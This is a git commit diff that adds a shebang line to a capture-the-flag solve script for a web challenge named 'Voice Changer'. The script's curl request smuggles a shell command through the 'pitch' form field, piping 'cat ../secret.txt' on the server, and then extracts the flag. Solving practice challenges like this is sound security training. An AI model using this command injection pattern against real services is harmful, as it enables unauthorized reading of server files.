7ce3b10a4f553d049ec8c4da114f85fb90408e01
Lautaro Aria <48163730+LauAria@users.noreply.github.com>
2024-01-14 00:05:23 -0300

    Update solve.sh

--- aria-huggias/Web - Voice Changer/solve.sh
+++ aria-huggias/Web - Voice Changer/solve.sh
@@ -1,3 +1,4 @@
+#!/bin/bash
 curl --location 'https://uoftctf-voice-changer.chals.io/upload' \
 --form 'pitch="\" >/dev/null | cat ../secret.txt #"' \
 --form 'input-file=@"audio.ogg"' -s | grep -o 'uoftctf{[^}]*}'
